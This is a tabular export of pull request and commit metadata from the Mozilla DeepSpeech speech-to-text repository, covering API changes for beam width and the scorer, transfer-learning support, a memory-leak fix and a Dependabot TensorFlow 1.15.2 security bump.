1436,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2702,2702,Embed beam width in exported model and move parameter out of CreateModel,"Continuing the theme of having defaults and optionally overriding them, this moves the beam width parameter out of CreateModel. This PR has #2681 as its base since it's built on top of that. It needs to wait until that merges and then the base can be set to master.",reuben,477142,2020-01-29T10:36:27Z,MEMBER,False,5002,1019,108,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e4b1b1772a717b20e3b4defff92cc5f6c92e78a3,Change decoder API
1437,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2702,2702,Embed beam width in exported model and move parameter out of CreateModel,"Continuing the theme of having defaults and optionally overriding them, this moves the beam width parameter out of CreateModel. This PR has #2681 as its base since it's built on top of that. It needs to wait until that merges and then the base can be set to master.",reuben,477142,2020-01-29T10:36:27Z,MEMBER,False,5002,1019,108,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1a8c739f13e40c317a5a03ae4a54a36f4af01fad,Switch to new scorer format
1438,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2702,2702,Embed beam width in exported model and move parameter out of CreateModel,"Continuing the theme of having defaults and optionally overriding them, this moves the beam width parameter out of CreateModel. This PR has #2681 as its base since it's built on top of that. It needs to wait until that merges and then the base can be set to master.",reuben,477142,2020-01-29T10:36:27Z,MEMBER,False,5002,1019,108,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,481fc971976ee1e1d0c91ad067af184f9b2a08c5,Switch smoke test scorer to new format
1439,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2702,2702,Embed beam width in exported model and move parameter out of CreateModel,"Continuing the theme of having defaults and optionally overriding them, this moves the beam width parameter out of CreateModel. This PR has #2681 as its base since it's built on top of that. It needs to wait until that merges and then the base can be set to master.",reuben,477142,2020-01-29T10:36:27Z,MEMBER,False,5002,1019,108,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,adb70ebc0f952a0e6e3eecd59d2853b78cbe1839,Add tool to extract vocabulary from the old LM binary format
1440,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2702,2702,Embed beam width in exported model and move parameter out of CreateModel,"Continuing the theme of having defaults and optionally overriding them, this moves the beam width parameter out of CreateModel. This PR has #2681 as its base since it's built on top of that. It needs to wait until that merges and then the base can be set to master.",reuben,477142,2020-01-29T10:36:27Z,MEMBER,False,5002,1019,108,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,30a6b4055e2593a44f414473923c2123f9637c21,Update all API consumers
1441,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2702,2702,Embed beam width in exported model and move parameter out of CreateModel,"Continuing the theme of having defaults and optionally overriding them, this moves the beam width parameter out of CreateModel. This PR has #2681 as its base since it's built on top of that. It needs to wait until that merges and then the base can be set to master.",reuben,477142,2020-01-29T10:36:27Z,MEMBER,False,5002,1019,108,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4d4ebca443e8b8e70ed3e80e7d79e4cab6f2366f,"Fix linter errors

X-DeepSpeech: NOBUILD"
1442,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2702,2702,Embed beam width in exported model and move parameter out of CreateModel,"Continuing the theme of having defaults and optionally overriding them, this moves the beam width parameter out of CreateModel. This PR has #2681 as its base since it's built on top of that. It needs to wait until that merges and then the base can be set to master.",reuben,477142,2020-01-29T10:36:27Z,MEMBER,False,5002,1019,108,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a066c87cd636ef73c13568c91f4f0f0bc0f22525,Improve error handling around Scorer loading
1443,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2702,2702,Embed beam width in exported model and move parameter out of CreateModel,"Continuing the theme of having defaults and optionally overriding them, this moves the beam width parameter out of CreateModel. This PR has #2681 as its base since it's built on top of that. It needs to wait until that merges and then the base can be set to master.",reuben,477142,2020-01-29T10:36:27Z,MEMBER,False,5002,1019,108,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4b7359d4c6341a0ccd3855ea8164cb133eae41cc,Address review comments and update docs
1444,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2702,2702,Embed beam width in exported model and move parameter out of CreateModel,"Continuing the theme of having defaults and optionally overriding them, this moves the beam width parameter out of CreateModel. This PR has #2681 as its base since it's built on top of that. It needs to wait until that merges and then the base can be set to master.",reuben,477142,2020-01-29T10:36:27Z,MEMBER,False,5002,1019,108,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3bd1e55cea71bc309621799c51185166403a02b3,Embed default beam width into exported graph and remove param from DS_CreateModel
1445,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2702,2702,Embed beam width in exported model and move parameter out of CreateModel,"Continuing the theme of having defaults and optionally overriding them, this moves the beam width parameter out of CreateModel. This PR has #2681 as its base since it's built on top of that. It needs to wait until that merges and then the base can be set to master.",reuben,477142,2020-01-29T10:36:27Z,MEMBER,False,5002,1019,108,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,aa0c88b80bdfd5a5afb9aa45e0633e660c9081de,Fix consumers of DS_CreateModel
1446,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2702,2702,Embed beam width in exported model and move parameter out of CreateModel,"Continuing the theme of having defaults and optionally overriding them, this moves the beam width parameter out of CreateModel. This PR has #2681 as its base since it's built on top of that. It needs to wait until that merges and then the base can be set to master.",reuben,477142,2020-01-29T10:36:27Z,MEMBER,False,5002,1019,108,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b6538642eb5890d05740b2df7e60d657efed70b9,"Fix CI errors, address comments, update examples"
1447,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2702,2702,Embed beam width in exported model and move parameter out of CreateModel,"Continuing the theme of having defaults and optionally overriding them, this moves the beam width parameter out of CreateModel. This PR has #2681 as its base since it's built on top of that. It needs to wait until that merges and then the base can be set to master.",reuben,477142,2020-01-29T10:36:27Z,MEMBER,False,5002,1019,108,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f865442219993af83dfa9ee27f955b9d19c22d8a,Fix nits
1448,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2700,2700,Improve SWIG reference,,lissyx,1645737,2020-01-29T10:12:05Z,COLLABORATOR,True,29,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,38db9a2441a72c260a6f6756f8d50b3fb2252d47,Improve SWIG reference
1449,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2698,2698,Bump tensorflow from 1.15.0 to 1.15.2,"Bumps [tensorflow](https://github.com/tensorflow/tensorflow) from 1.15.0 to 1.15.2.
<details>
<summary>Release notes</summary>

*Sourced from [tensorflow's releases](https://github.com/tensorflow/tensorflow/releases).*

> ## TensorFlow 1.15.2
> # Release 1.15.2
> 
> ## Bug Fixes and Other Changes
> * Fixes a security vulnerability where converting a Python string to a `tf.float16` value produces a segmentation fault ([CVE-2020-5215](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-5215))
> * Updates `curl` to `7.66.0` to handle [CVE-2019-5482](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-5482) and [CVE-2019-5481](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-5481)
> * Updates `sqlite3` to `3.30.01` to handle [CVE-2019-19646](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-19646), [CVE-2019-19645](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-19645) and [CVE-2019-16168](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16168)
</details>
<details>
<summary>Changelog</summary>

*Sourced from [tensorflow's changelog](https://github.com/tensorflow/tensorflow/blob/master/RELEASE.md).*

> # Release 1.15.2
> 
> ## Bug Fixes and Other Changes
> * Fixes a security vulnerability where converting a Python string to a `tf.float16` value produces a segmentation fault ([CVE-2020-5215](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-5215))
> * Updates `curl` to `7.66.0` to handle [CVE-2019-5482](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-5482) and [CVE-2019-5481](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-5481)
> * Updates `sqlite3` to `3.30.01` to handle [CVE-2019-19646](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-19646), [CVE-2019-19645](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-19645) and [CVE-2019-16168](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16168)
> 
> 
> # Release 2.1.0
> 
> TensorFlow 2.1 will be the last TF release supporting Python 2. Python 2 support [officially ends an January 1, 2020](https://www.python.org/dev/peps/pep-0373/#update). [As announced earlier](https://groups.google.com/a/tensorflow.org/d/msg/announce/gVwS5RC8mds/dCt1ka2XAAAJ), TensorFlow will also stop supporting Python 2 starting January 1, 2020, and no more releases are expected in 2019.
> 
> ## Major Features and Improvements
> * The `tensorflow` pip package now includes GPU support by default (same as `tensorflow-gpu`) for both Linux and Windows. This runs on machines with and without NVIDIA GPUs. `tensorflow-gpu` is still available, and CPU-only packages can be downloaded at `tensorflow-cpu` for users who are concerned about package size.
> * **Windows users:** Officially-released `tensorflow` Pip packages are now built with Visual Studio 2019 version 16.4 in order to take advantage of the new `/d2ReducedOptimizeHugeFunctions` compiler flag. To use these new packages, you must install ""Microsoft Visual C++ Redistributable for Visual Studio 2015, 2017 and 2019"", available from Microsoft's website [here](https://support.microsoft.com/help/2977003/the-latest-supported-visual-c-downloads).
>   * This does not change the minimum required version for building TensorFlow from source on Windows, but builds enabling `EIGEN_STRONG_INLINE` can take over 48 hours to compile without this flag. Refer to `configure.py` for more information about `EIGEN_STRONG_INLINE` and `/d2ReducedOptimizeHugeFunctions`.
>   * If either of the required DLLs, `msvcp140.dll` (old) or `msvcp140_1.dll` (new), are missing on your machine, `import tensorflow` will print a warning message.
> * The `tensorflow` pip package is built with CUDA 10.1 and cuDNN 7.6.
> * `tf.keras`
>   * Experimental support for mixed precision is available on GPUs and Cloud TPUs. See [usage guide](https://www.tensorflow.org/guide/keras/mixed_precision).
>   * Introduced the `TextVectorization` layer, which takes as input raw strings and takes care of text standardization, tokenization, n-gram generation, and vocabulary indexing. See this [end-to-end text classification example](https://colab.research.google.com/drive/1RvCnR7h0_l4Ekn5vINWToI9TNJdpUZB3).
>   * Keras `.compile` `.fit` `.evaluate` and `.predict` are allowed to be outside of the DistributionStrategy scope, as long as the model was constructed inside of a scope.
>   * Experimental support for Keras `.compile`, `.fit`, `.evaluate`, and `.predict` is available for Cloud TPUs, Cloud TPU, for all types of Keras models (sequential, functional and subclassing models).
>   * Automatic outside compilation is now enabled for Cloud TPUs. This allows `tf.summary` to be used more conveniently with Cloud TPUs.
>   * Dynamic batch sizes with DistributionStrategy and Keras are supported on Cloud TPUs.
>   * Support for `.fit`, `.evaluate`, `.predict` on TPU using numpy data, in addition to `tf.data.Dataset`.
>   * Keras reference implementations for many popular models are available in the TensorFlow [Model Garden](https://github.com/tensorflow/models/tree/master/official).
> * `tf.data`
>   * Changes rebatching for `tf.data datasets` + DistributionStrategy for better performance. Note that the dataset also behaves slightly differently, in that the rebatched dataset cardinality will always be a multiple of the number of replicas.
>   * `tf.data.Dataset` now supports automatic data distribution and sharding in distributed environments, including on TPU pods.
>   * Distribution policies for `tf.data.Dataset` can now be tuned with 1. `tf.data.experimental.AutoShardPolicy(OFF, AUTO, FILE, DATA)` 2. `tf.data.experimental.ExternalStatePolicy(WARN, IGNORE, FAIL)`
> * `tf.debugging`
>   * Add `tf.debugging.enable_check_numerics()` and `tf.debugging.disable_check_numerics()` to help debugging the root causes of issues involving infinities and `NaN`s.
> * `tf.distribute`
>   * Custom training loop support on TPUs and TPU pods is avaiable through `strategy.experimental_distribute_dataset`, `strategy.experimental_distribute_datasets_from_function`, `strategy.experimental_run_v2`, `strategy.reduce`.
>   * Support for a global distribution strategy through `tf.distribute.experimental_set_strategy(),` in addition to `strategy.scope()`.
> * `TensorRT`
>   * [TensorRT 6.0](https://developer.nvidia.com/tensorrt#tensorrt-whats-new) is now supported and enabled by default. This adds support for more TensorFlow ops including Conv3D, Conv3DBackpropInputV2, AvgPool3D, MaxPool3D, ResizeBilinear, and ResizeNearestNeighbor. In addition, the TensorFlow-TensorRT python conversion API is exported as `tf.experimental.tensorrt.Converter`.
> * Environment variable `TF_DETERMINISTIC_OPS` has been added. When set to ""true"" or ""1"", this environment variable makes `tf.nn.bias_add` operate deterministically (i.e. reproducibly), but currently only when XLA JIT compilation is *not* enabled. Setting `TF_DETERMINISTIC_OPS` to ""true"" or ""1"" also makes cuDNN convolution and max-pooling operate deterministically. This makes Keras Conv\*D and MaxPool\*D layers operate deterministically in both the forward and backward directions when running on a CUDA-enabled GPU.
> 
> ## Breaking Changes
> * Deletes `Operation.traceback_with_start_lines` for which we know of no usages.
> * Removed `id` from `tf.Tensor.__repr__()` as `id` is not useful other than internal debugging.
> * Some `tf.assert_*` methods now raise assertions at operation creation time if the input tensors' values are known at that time, not during the `session.run()`. This only changes behavior when the graph execution would have resulted in an error. When this happens, a noop is returned and the input tensors are marked non-feedable. In other words, if they are used as keys in `feed_dict` argument to `session.run()`, an error will be raised. Also, because some assert ops don't make it into the graph, the graph structure changes. A different graph can result in different per-op random seeds when they are not given explicitly (most often).
> * The following APIs are not longer experimental: `tf.config.list_logical_devices`, `tf.config.list_physical_devices`, `tf.config.get_visible_devices`, `tf.config.set_visible_devices`, `tf.config.get_logical_device_configuration`, `tf.config.set_logical_device_configuration`.
> * `tf.config.experimentalVirtualDeviceConfiguration` has been renamed to `tf.config.LogicalDeviceConfiguration`.
> * `tf.config.experimental_list_devices` has been removed, please use
> `tf.config.list_logical_devices`.
> 
> ## Bug Fixes and Other Changes
></tr></table> ... (truncated)
</details>
<details>
<summary>Commits</summary>

- [`5d80e1e`](https://github.com/tensorflow/tensorflow/commit/5d80e1e8e6ee999be7db39461e0e79c90403a2e4) Merge pull request [#36215](https://github-redirect.dependabot.com/tensorflow/tensorflow/issues/36215) from tensorflow-jenkins/version-numbers-1.15.2-8214
- [`71e9d8f`](https://github.com/tensorflow/tensorflow/commit/71e9d8f8eddfe283943d62554d4c676bdaf79372) Update version numbers to 1.15.2
- [`e50120e`](https://github.com/tensorflow/tensorflow/commit/e50120ee34e1e29252f4cbc8ac4cd328e9a9840c) Merge pull request [#36214](https://github-redirect.dependabot.com/tensorflow/tensorflow/issues/36214) from tensorflow-jenkins/relnotes-1.15.2-2203
- [`1a7e9fb`](https://github.com/tensorflow/tensorflow/commit/1a7e9fbf670ef9d03b2f8fdf1ae2276b2d100fab) Releasing 1.15.2 instead of 1.15.1
- [`85f7aab`](https://github.com/tensorflow/tensorflow/commit/85f7aab93b65ed1fcc589f54d40793b1afb65bf4) Insert release notes place-fill
- [`e75a6d6`](https://github.com/tensorflow/tensorflow/commit/e75a6d6e6e20df83f19e72e04c7984587d768bd3) Merge pull request [#36190](https://github-redirect.dependabot.com/tensorflow/tensorflow/issues/36190) from tensorflow/mm-r1.15-fix-v2-build
- [`a6d8973`](https://github.com/tensorflow/tensorflow/commit/a6d897351e483dfd0418e5cad2900ad9ef24188c) Use `config=v1` as this is `r1.15` branch.
- [`fdb8589`](https://github.com/tensorflow/tensorflow/commit/fdb85890df5df1e6b3867c842aabb44f561b446d) Merge pull request [#35912](https://github-redirect.dependabot.com/tensorflow/tensorflow/issues/35912) from tensorflow-jenkins/relnotes-1.15.1-31298
- [`a6051e8`](https://github.com/tensorflow/tensorflow/commit/a6051e8094c5e7d26ec9573a740246c92e4057a2) Add CVE number for main patch
- [`360b2e3`](https://github.com/tensorflow/tensorflow/commit/360b2e318af2db59152e35be31c8aab1fb164088) Merge pull request [#34532](https://github-redirect.dependabot.com/tensorflow/tensorflow/issues/34532) from ROCmSoftwarePlatform/r1.15-rccl-upstream-patch
- Additional commits viewable in [compare view](https://github.com/tensorflow/tensorflow/compare/v1.15.0...v1.15.2)
</details>
<br />

[![Dependabot compatibility score](https://dependabot-badges.githubapp.com/badges/compatibility_score?dependency-name=tensorflow&package-manager=pip&previous-version=1.15.0&new-version=1.15.2)](https://help.github.com/articles/configuring-automated-security-fixes)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot ignore this [patch|minor|major] version` will close this PR and stop Dependabot creating any more for this minor/major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language

You can disable automated security fix PRs for this repo from the [Security Alerts page](https://github.com/mozilla/DeepSpeech/network/alerts).

</details>",dependabot[bot],49699333,2020-01-28T22:14:11Z,NONE,False,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e5c29d173359b94b918a11ced955d8d954294289,"Bump tensorflow from 1.15.0 to 1.15.2

Bumps [tensorflow](https://github.com/tensorflow/tensorflow) from 1.15.0 to 1.15.2.
- [Release notes](https://github.com/tensorflow/tensorflow/releases)
- [Changelog](https://github.com/tensorflow/tensorflow/blob/master/RELEASE.md)
- [Commits](https://github.com/tensorflow/tensorflow/compare/v1.15.0...v1.15.2)

Signed-off-by: dependabot[bot] <support@github.com>"
1450,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2696,2696,Transfer-learning patch from a nice clean branch,"This PR adds (1) changes to `Deepspeech.py` and `utils/flags.py` which allow Transfer learning from a pre-trained model, and (2) new files in `bin` for taskcluster testing.

The taskcluster tests need to be worked into the current setup, because they assume existence of a pre-trained `0.6.1` release model",JRMeyer,8389864,2020-01-28T15:19:13Z,CONTRIBUTOR,False,340,114,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,04007ac77672bb14f26365dd7a1db066dd3ceb48,Transfer-learning patch from a nice clean branch
1451,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2696,2696,Transfer-learning patch from a nice clean branch,"This PR adds (1) changes to `Deepspeech.py` and `utils/flags.py` which allow Transfer learning from a pre-trained model, and (2) new files in `bin` for taskcluster testing.

The taskcluster tests need to be worked into the current setup, because they assume existence of a pre-trained `0.6.1` release model",JRMeyer,8389864,2020-01-28T15:19:13Z,CONTRIBUTOR,False,340,114,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5335a86ccebbcc3c2554c28986fe8d1d6ac485ab,fix whitespace nits
1452,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2696,2696,Transfer-learning patch from a nice clean branch,"This PR adds (1) changes to `Deepspeech.py` and `utils/flags.py` which allow Transfer learning from a pre-trained model, and (2) new files in `bin` for taskcluster testing.

The taskcluster tests need to be worked into the current setup, because they assume existence of a pre-trained `0.6.1` release model",JRMeyer,8389864,2020-01-28T15:19:13Z,CONTRIBUTOR,False,340,114,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5f858a2a588c974ea7ae5331698cf806c977382c,"WIP -- Refactoring try_loading()

X-DEEPSPEECH: NOBUILD"
1453,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2696,2696,Transfer-learning patch from a nice clean branch,"This PR adds (1) changes to `Deepspeech.py` and `utils/flags.py` which allow Transfer learning from a pre-trained model, and (2) new files in `bin` for taskcluster testing.

The taskcluster tests need to be worked into the current setup, because they assume existence of a pre-trained `0.6.1` release model",JRMeyer,8389864,2020-01-28T15:19:13Z,CONTRIBUTOR,False,340,114,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7ac0527dd3c327c6849816a86c0899f4a5af2c4b,fixed the loading flags and moved loding functions to util/helpers.py
1454,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2696,2696,Transfer-learning patch from a nice clean branch,"This PR adds (1) changes to `Deepspeech.py` and `utils/flags.py` which allow Transfer learning from a pre-trained model, and (2) new files in `bin` for taskcluster testing.

The taskcluster tests need to be worked into the current setup, because they assume existence of a pre-trained `0.6.1` release model",JRMeyer,8389864,2020-01-28T15:19:13Z,CONTRIBUTOR,False,340,114,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,81ef9461062bf810ab6906fd2eac032ce73e496f,fixed cudnn and transfer loading bugs
1455,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2696,2696,Transfer-learning patch from a nice clean branch,"This PR adds (1) changes to `Deepspeech.py` and `utils/flags.py` which allow Transfer learning from a pre-trained model, and (2) new files in `bin` for taskcluster testing.

The taskcluster tests need to be worked into the current setup, because they assume existence of a pre-trained `0.6.1` release model",JRMeyer,8389864,2020-01-28T15:19:13Z,CONTRIBUTOR,False,340,114,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5aa01d2d9cf5be76ad31f0d12921af30db074ce5,some flag changes and better testing
1456,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2696,2696,Transfer-learning patch from a nice clean branch,"This PR adds (1) changes to `Deepspeech.py` and `utils/flags.py` which allow Transfer learning from a pre-trained model, and (2) new files in `bin` for taskcluster testing.

The taskcluster tests need to be worked into the current setup, because they assume existence of a pre-trained `0.6.1` release model",JRMeyer,8389864,2020-01-28T15:19:13Z,CONTRIBUTOR,False,340,114,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,22771fae23572f79294a17142404179e5c647903,uncomment GPU flag
1457,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2696,2696,Transfer-learning patch from a nice clean branch,"This PR adds (1) changes to `Deepspeech.py` and `utils/flags.py` which allow Transfer learning from a pre-trained model, and (2) new files in `bin` for taskcluster testing.

The taskcluster tests need to be worked into the current setup, because they assume existence of a pre-trained `0.6.1` release model",JRMeyer,8389864,2020-01-28T15:19:13Z,CONTRIBUTOR,False,340,114,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,88063dd9ce5c2dac71838471f799857cf5279bd4,addressing PR review reuben and alex
1458,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2696,2696,Transfer-learning patch from a nice clean branch,"This PR adds (1) changes to `Deepspeech.py` and `utils/flags.py` which allow Transfer learning from a pre-trained model, and (2) new files in `bin` for taskcluster testing.

The taskcluster tests need to be worked into the current setup, because they assume existence of a pre-trained `0.6.1` release model",JRMeyer,8389864,2020-01-28T15:19:13Z,CONTRIBUTOR,False,340,114,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,649d1525225a226b8880c0c98ff705a38ce565e7,WIP -- bug when loading model for testing
1459,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2696,2696,Transfer-learning patch from a nice clean branch,"This PR adds (1) changes to `Deepspeech.py` and `utils/flags.py` which allow Transfer learning from a pre-trained model, and (2) new files in `bin` for taskcluster testing.

The taskcluster tests need to be worked into the current setup, because they assume existence of a pre-trained `0.6.1` release model",JRMeyer,8389864,2020-01-28T15:19:13Z,CONTRIBUTOR,False,340,114,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bcf34ed259794ef12ee991143847d185609ec2c6,loading model now works for both training and testing
1460,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2696,2696,Transfer-learning patch from a nice clean branch,"This PR adds (1) changes to `Deepspeech.py` and `utils/flags.py` which allow Transfer learning from a pre-trained model, and (2) new files in `bin` for taskcluster testing.

The taskcluster tests need to be worked into the current setup, because they assume existence of a pre-trained `0.6.1` release model",JRMeyer,8389864,2020-01-28T15:19:13Z,CONTRIBUTOR,False,340,114,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,92c9875bb3729337f0117e29615261f9e4639027,"revert to old run-ldc93s1.sh, which was changed by accident"
1461,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2696,2696,Transfer-learning patch from a nice clean branch,"This PR adds (1) changes to `Deepspeech.py` and `utils/flags.py` which allow Transfer learning from a pre-trained model, and (2) new files in `bin` for taskcluster testing.

The taskcluster tests need to be worked into the current setup, because they assume existence of a pre-trained `0.6.1` release model",JRMeyer,8389864,2020-01-28T15:19:13Z,CONTRIBUTOR,False,340,114,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d8f5b7281a614c8e0092cf460cb906771bb267cf,better commenting / logging
1462,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2696,2696,Transfer-learning patch from a nice clean branch,"This PR adds (1) changes to `Deepspeech.py` and `utils/flags.py` which allow Transfer learning from a pre-trained model, and (2) new files in `bin` for taskcluster testing.

The taskcluster tests need to be worked into the current setup, because they assume existence of a pre-trained `0.6.1` release model",JRMeyer,8389864,2020-01-28T15:19:13Z,CONTRIBUTOR,False,340,114,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,75e75498d304ef743c23367056c315c2a4ab3d35,white space fixes
1463,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2696,2696,Transfer-learning patch from a nice clean branch,"This PR adds (1) changes to `Deepspeech.py` and `utils/flags.py` which allow Transfer learning from a pre-trained model, and (2) new files in `bin` for taskcluster testing.

The taskcluster tests need to be worked into the current setup, because they assume existence of a pre-trained `0.6.1` release model",JRMeyer,8389864,2020-01-28T15:19:13Z,CONTRIBUTOR,False,340,114,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dfd336bfb1deb6f153b7c28a8117823483c44021,fixed exporting model error due to wrong ckpt flag
1464,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2696,2696,Transfer-learning patch from a nice clean branch,"This PR adds (1) changes to `Deepspeech.py` and `utils/flags.py` which allow Transfer learning from a pre-trained model, and (2) new files in `bin` for taskcluster testing.

The taskcluster tests need to be worked into the current setup, because they assume existence of a pre-trained `0.6.1` release model",JRMeyer,8389864,2020-01-28T15:19:13Z,CONTRIBUTOR,False,340,114,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,26ce8a7a2453adf80e084085bca7aa65b257c129,Merge branch 'master' into transfer-learning-cleanBranch
1465,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2695,2695,Use std::unique_ptr<> for TensorFlow session,,lissyx,1645737,2020-01-28T09:18:31Z,COLLABORATOR,True,8,7,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,656eea4622c541cc7f3cb70d43c6916ae054f750,Use std::unique_ptr<> for TensorFlow session
1466,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2694,2694,Fix a memory leak in tfmodelstate.cc,"`tensorflow::Session* session_` defined in tfmodelstate.h is deleted nowhere, so when I create and delete an instance of TFModelState repeatedly, I found a memory leak.",ryojiysd,17523227,2020-01-28T01:16:18Z,CONTRIBUTOR,False,1,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,18a0d5f6ec7daa3d7d83856f8516cc1ea040e02c,Fix a memory leak in tfmodelstate.cc
